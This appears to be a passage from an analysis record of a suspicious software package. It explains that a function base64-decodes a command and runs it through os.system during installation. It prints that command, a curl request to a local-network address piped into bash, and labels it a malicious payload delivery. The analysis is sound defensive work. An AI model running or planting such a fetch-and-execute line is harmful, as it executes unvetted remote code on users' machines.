This function decodes a base64-encoded string and passes it to os.system, resulting in the execution of the following shell command: 'curl  -s http://192.168.1.34:8000/test.txt | bash'. This command downloads and executes a shell script from a remote server, which is a classic example of a malicious payload delivery mechanism. This behavior is hidden in the installation process and is not expected in legitimate packages.",
